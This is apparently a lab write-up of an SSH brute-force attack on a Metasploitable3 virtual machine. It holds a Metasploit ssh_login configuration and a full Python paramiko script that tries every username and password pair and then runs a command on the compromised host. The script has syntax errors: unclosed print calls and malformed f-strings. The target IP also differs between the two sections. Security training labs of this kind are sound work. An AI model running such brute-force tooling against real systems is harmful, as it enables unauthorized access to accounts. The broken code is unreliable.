# Phase 1: SSH Service Compromise  


## 📝 Overview  
This phase demonstrates SSH brute force attacks against Metasploitable3 using:
- 🛠️ Metasploit Framework (`ssh_login` module)  
- 🐍 Custom Python brute force script  
- 🔍 Successfully identified vulnerable credentials `vagrant:vagrant`

---

## ⚔️ Attack Methodologies

### 1. Metasploit Brute Force Attack
**Configuration:**  
```bash
use auxiliary/scanner/ssh/ssh_login
set RHOST 192.168.56.102
set RPORT 22
set USER_FILE /absolute/path/usernames.txt
set PASS_FILE /absolute/path/passwords.txt
set THREADS 3
run
📤 Output:
[*] 192.168.56.102:22 - Starting bruteforce
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
🔑 Key Findings:

🔍 Required absolute paths for credential files

⌨️ Case-sensitive commands (set not SET)

✅ Completed full scan of target system

2. Custom Python Brute Force
📜 Script: compromise.py
import paramiko
import time

TARGET_IP = "192.168.56.103"
PORT = 22
USERNAME_FILE = "username.stxt"
PASSWORD_FILE = "password.stxt"
COMMAND_TO_RUN = "ip a"

def attempt_login(hostname, port, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=hostname, port=port, username=username, password=password, timeout=5)
        print(f"{+} Successfully logged in as {username}:{password} on {hostname}"
        return client
    except paramiko.AuthenticationException:
        print(f"{-} Login failed for {username}:{password} on {hostname}"
    except paramiko.SSHException as e:
        print(f"{-} SSH error connecting to {hostname}: {e}"
    except Exception as e:
        print(f"{-} An error occurred: {e}"
    return None

def execute_command(client, command):
    try:
        stdin, stdout, stderr = client.exec_command(command)
        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()
        if output:
            print(f"{+} Command executed successfully. Output:\n(output)")
        if error:
            print(f"{-} Error executing command:\n(error)")
    except Exception as e:
        print(f"{-} Error executing command: {e}")

def main():
    usernames = []
    passwords = []

    try:
        with open(USERNAME_FILE, 'r') as f:
            usernames = [line.strip() for line in f]
    except FileNotFoundError:
        print(f"{-} Error: {USERNAME_FILE} not found.")
        return

    try:
        with open(PASSWORD_FILE, 'r') as f:
            passwords = [line.strip() for line in f]
    except FileNotFoundError:
        print(f"{-} Error: {PASSWORD_FILE} not found.")
        return

    for username in usernames:
        for password in passwords:
            print(f"{+} Trying {username}:{password} on {TARGET_IP}:{PORT}")
            ssh_client = attempt_login(TARGET_IP, PORT, username, password)
            if ssh_client:
                print(f"{+} Proof of Concept:")
                execute_command(ssh_client, COMMAND_TO_RUN)
                ssh_client.close()
                print(f"{+} Connection closed.")
                return

if __name__ == "__main__":
    main()
🚀 Execution:
python3 compromise.py
📤 Output:
[+] Successfully logged in as vagrant:vagrant

🔓 Discovered Credentials:
Username: vagrant
Password: vagrant

📋 Requirements
🛠️ Metasploit Framework (v6.3+)

🐍 Python 3.8+

🔌 Paramiko (pip install paramiko)
